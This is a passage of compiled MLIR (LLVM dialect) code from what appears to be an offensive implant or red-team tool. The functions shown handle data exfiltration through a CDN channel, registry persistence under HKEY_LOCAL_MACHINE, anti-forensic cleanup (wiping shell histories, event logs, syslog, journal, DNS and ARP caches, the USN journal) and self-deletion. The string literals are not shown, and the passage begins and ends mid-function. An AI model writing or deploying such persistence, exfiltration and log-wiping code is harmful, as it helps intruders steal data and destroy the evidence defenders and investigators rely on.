  ^bb1:  // pred: ^bb0
    %42 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%42) : (!llvm.ptr) -> ()
    %43 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %44 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %45 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %46 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<5 x i8>
    llvm.call @log_operation(%43, %44, %45, %46) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    llvm.return
  }
  llvm.func @exfiltrate_via_cdn() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.138" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.139" : !llvm.ptr
    %4 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.122" : !llvm.ptr
    %6 = llvm.mlir.addressof @loaded_drivers : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.140" : !llvm.ptr
    %8 = llvm.mlir.constant(34 : i32) : i32
    %9 = llvm.mlir.addressof @".str.0" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.141" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.3" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.146" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.125" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.145" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.34" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.142" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.143" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.144" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.127" : !llvm.ptr
    %20 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %21 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %22 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %23 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %24 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %26 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> f64
    %27 = llvm.fptosi %26 : f64 to i64
    %28 = llvm.call @string(%27) : (i64) -> !llvm.ptr
    %29 = llvm.call @jocky_str_concat(%25, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %30 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %31 = llvm.call @jocky_str_concat(%29, %30) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %32 = llvm.load %6 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %33 = llvm.call @array_len(%32) : (!llvm.ptr) -> i64
    %34 = llvm.call @string(%33) : (i64) -> !llvm.ptr
    %35 = llvm.call @jocky_str_concat(%31, %34) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %35, %20 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %36 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.store %36, %21 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.store %8, %22 {alignment = 4 : i64} : i32, !llvm.ptr
    %37 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %38 = llvm.call @jocky_getenv(%37) : (!llvm.ptr) -> !llvm.ptr
    %39 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<22 x i8>
    %40 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %41 = llvm.call @jocky_getenv(%40) : (!llvm.ptr) -> !llvm.ptr
    %42 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %43 = llvm.load %22 {alignment = 4 : i64} : !llvm.ptr -> i32
    %44 = llvm.load %20 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %45 = llvm.mlir.addressof @exfil_local_cdn : !llvm.ptr
    %46 = llvm.call %45(%38, %39, %41, %42, %43, %44) : !llvm.ptr, (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32, !llvm.ptr) -> i32
    llvm.store %46, %23 {alignment = 4 : i64} : i32, !llvm.ptr
    %47 = llvm.load %23 {alignment = 4 : i64} : !llvm.ptr -> i32
    %48 = llvm.icmp "eq" %47, %2 : i32
    llvm.cond_br %48, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %49 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    %50 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %51 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %52 = llvm.call @jocky_getenv(%51) : (!llvm.ptr) -> !llvm.ptr
    %53 = llvm.call @jocky_str_concat(%50, %52) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%53) : (!llvm.ptr) -> ()
    %54 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<44 x i8>
    llvm.call @println(%54) : (!llvm.ptr) -> ()
    %55 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %56 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %57 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %58 = llvm.call @jocky_getenv(%57) : (!llvm.ptr) -> !llvm.ptr
    %59 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.call @log_operation(%55, %56, %58, %59) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb2:  // pred: ^bb0
    %60 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%60) : (!llvm.ptr) -> ()
    %61 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %62 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %63 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %64 = llvm.call @jocky_getenv(%63) : (!llvm.ptr) -> !llvm.ptr
    %65 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @log_operation(%61, %62, %64, %65) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb1, ^bb2
    llvm.return
  }
  llvm.func @setup_persistence_and_registry() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.147" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.constant(256 : i32) : i32
    %4 = llvm.mlir.addressof @".str.148" : !llvm.ptr
    %5 = llvm.mlir.constant(-2147483646 : i32) : i32
    %6 = llvm.mlir.addressof @".str.156" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.149" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.150" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.151" : !llvm.ptr
    %10 = llvm.mlir.constant(32 : i32) : i32
    %11 = llvm.mlir.addressof @".str.152" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.153" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.154" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.155" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.127" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %17 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %18 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %19 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    %20 = llvm.sext %3 : i32 to i64
    %21 = llvm.call @jocky_alloc(%20) : (i64) -> !llvm.ptr
    llvm.store %21, %17 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %22 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<46 x i8>
    %23 = llvm.load %17 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %24 = llvm.mlir.addressof @jocky_registry_create_key : !llvm.ptr
    %25 = llvm.call %24(%5, %22, %23) : !llvm.ptr, (i32, !llvm.ptr, !llvm.ptr) -> i1
    llvm.store %25, %18 {alignment = 1 : i64} : i1, !llvm.ptr
    %26 = llvm.load %18 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %26, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %27 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @println(%27) : (!llvm.ptr) -> ()
    %28 = llvm.load %17 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %29 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %30 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %31 = llvm.mlir.addressof @jocky_registry_set_value : !llvm.ptr
    %32 = llvm.call %31(%28, %29, %30, %10, %0) : !llvm.ptr, (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32) -> i1
    %33 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%33) : (!llvm.ptr) -> ()
    %34 = llvm.load %17 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %35 = llvm.mlir.addressof @jocky_registry_close_key : !llvm.ptr
    %36 = llvm.call %35(%34) : !llvm.ptr, (!llvm.ptr) -> i1
    %37 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %38 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %39 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<34 x i8>
    %40 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.call @log_operation(%37, %38, %39, %40) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb2:  // pred: ^bb0
    %41 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%41) : (!llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb1, ^bb2
    %42 = llvm.load %17 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @jocky_free(%42) : (!llvm.ptr) -> ()
    %43 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%43) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @perform_forensic_cleanup() {
    %0 = llvm.mlir.addressof @".str.157" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.158" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.159" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.160" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.161" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.162" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.163" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.164" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %10 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%10) : (!llvm.ptr) -> ()
    %11 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @println(%11) : (!llvm.ptr) -> ()
    %12 = llvm.mlir.addressof @forensics_wipe_powershell_history : !llvm.ptr
    %13 = llvm.call %12() : !llvm.ptr, () -> i32
    %14 = llvm.mlir.addressof @forensics_wipe_cmd_history : !llvm.ptr
    %15 = llvm.call %14() : !llvm.ptr, () -> i32
    %16 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    %17 = llvm.mlir.addressof @jocky_cleanup_event_logs : !llvm.ptr
    %18 = llvm.call %17(%16) : !llvm.ptr, (!llvm.ptr) -> i32
    %19 = llvm.mlir.addressof @forensics_flush_arp_cache : !llvm.ptr
    %20 = llvm.call %19() : !llvm.ptr, () -> i32
    %21 = llvm.mlir.addressof @forensics_clear_dns_cache : !llvm.ptr
    %22 = llvm.call %21() : !llvm.ptr, () -> i32
    %23 = llvm.mlir.addressof @jocky_cleanup_usn_journal : !llvm.ptr
    %24 = llvm.call %23() : !llvm.ptr, () -> i32
    %25 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %27 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %28 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %29 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    llvm.call @log_operation(%26, %27, %28, %29) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %30 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%30) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @perform_forensic_cleanup_linux() {
    %0 = llvm.mlir.addressof @".str.165" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.166" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.161" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.162" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.167" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.164" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %8 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @println(%8) : (!llvm.ptr) -> ()
    %9 = llvm.mlir.addressof @linux_forensics_wipe_bash_history : !llvm.ptr
    %10 = llvm.call %9() : !llvm.ptr, () -> i32
    %11 = llvm.mlir.addressof @jocky_linux_cleanup_syslog : !llvm.ptr
    %12 = llvm.call %11() : !llvm.ptr, () -> i32
    %13 = llvm.mlir.addressof @jocky_linux_cleanup_journal : !llvm.ptr
    %14 = llvm.call %13() : !llvm.ptr, () -> i32
    %15 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %17 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %18 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %19 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    llvm.call @log_operation(%16, %17, %18, %19) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %20 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%20) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @perform_self_deletion() {
    %0 = llvm.mlir.addressof @".str.168" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.169" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.161" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.170" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.171" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.172" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %8 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%8) : (!llvm.ptr) -> ()
    llvm.call @jocky_self_delete() : () -> ()
    %9 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%9) : (!llvm.ptr) -> ()
    %10 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %11 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %12 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %13 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    llvm.call @log_operation(%10, %11, %12, %13) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %14 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%14) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @export_audit_trail() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.173" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.174" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.180" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.175" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.176" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.177" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.178" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.179" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %11 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %12 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %13 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%13) : (!llvm.ptr) -> ()
    %14 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.store %14, %11 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %15 = llvm.load %11 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %16 = llvm.mlir.addressof @audit_export : !llvm.ptr
    %17 = llvm.call %16(%15) : !llvm.ptr, (!llvm.ptr) -> i1
    %18 = llvm.call @audit_verify() : () -> i32
    llvm.store %18, %12 {alignment = 4 : i64} : i32, !llvm.ptr
    %19 = llvm.load %12 {alignment = 4 : i64} : !llvm.ptr -> i32
    %20 = llvm.icmp "eq" %19, %2 : i32
    llvm.cond_br %20, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %21 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    %22 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %23 = llvm.load %11 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %24 = llvm.call @jocky_str_concat(%22, %23) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %26 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %27 = llvm.load %11 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %28 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    llvm.call @log_operation(%25, %26, %27, %28) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb2:  // pred: ^bb0
    %29 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb1, ^bb2
    %30 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%30) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @print_summary() {
    %0 = llvm.mlir.addressof @".str.181" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.182" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.183" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.184" : !llvm.ptr
    %6 = llvm.mlir.addressof @operations_count : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.185" : !llvm.ptr
    %8 = llvm.mlir.addressof @loaded_drivers : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.186" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.43" : !llvm.ptr
    %11 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.187" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.188" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.189" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.190" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.191" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.192" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.193" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.194" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.195" : !llvm.ptr
    %21 = llvm.mlir.addressof @".str.196" : !llvm.ptr
    %22 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<81 x i8>
    llvm.call @println(%22) : (!llvm.ptr) -> ()
    %23 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<81 x i8>
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    %27 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    %28 = llvm.load %6 {alignment = 4 : i64} : !llvm.ptr -> i32
    %29 = llvm.sext %28 : i32 to i64
    %30 = llvm.call @string(%29) : (i64) -> !llvm.ptr
    %31 = llvm.call @jocky_str_concat(%27, %30) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    %33 = llvm.load %8 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %34 = llvm.call @array_len(%33) : (!llvm.ptr) -> i64
    %35 = llvm.call @string(%34) : (i64) -> !llvm.ptr
    %36 = llvm.call @jocky_str_concat(%32, %35) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%36) : (!llvm.ptr) -> ()
    %37 = llvm.load %8 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %38 = llvm.call @array_len(%37) : (!llvm.ptr) -> i64
    %39 = llvm.sext %1 : i32 to i64
    %40 = llvm.icmp "sgt" %38, %39 : i64
    llvm.cond_br %40, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %41 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %42 = llvm.load %8 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %43 = llvm.getelementptr %42[%1] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %44 = llvm.load %43 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %45 = llvm.call @jocky_str_concat(%41, %44) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%45) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %46 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %47 = llvm.load %11 {alignment = 8 : i64} : !llvm.ptr -> f64
    %48 = llvm.fptosi %47 : f64 to i64
    %49 = llvm.call @string(%48) : (i64) -> !llvm.ptr
    %50 = llvm.call @jocky_str_concat(%46, %49) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%50) : (!llvm.ptr) -> ()
    %51 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<39 x i8>
    llvm.call @println(%51) : (!llvm.ptr) -> ()
    %52 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%52) : (!llvm.ptr) -> ()
    %53 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%53) : (!llvm.ptr) -> ()
    %54 = llvm.getelementptr %14[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    llvm.call @println(%54) : (!llvm.ptr) -> ()
    %55 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%55) : (!llvm.ptr) -> ()
    %56 = llvm.getelementptr %16[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%56) : (!llvm.ptr) -> ()
    %57 = llvm.getelementptr %17[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
